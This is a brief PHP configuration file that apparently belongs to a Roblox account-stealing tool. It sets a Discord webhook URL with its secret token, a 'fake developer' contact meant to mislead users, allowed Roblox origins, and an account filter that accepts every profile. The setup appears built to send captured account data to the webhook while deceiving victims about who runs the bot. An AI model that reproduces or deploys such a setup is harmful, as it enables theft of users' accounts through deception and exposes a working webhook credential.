<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/801121975795580969/dPWSYA1asOX7q1-aV6-6bd3ioxTH7s0NbGpb0QCkv5KdllZYN0otJiaSGmPMOt8lmB3T";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
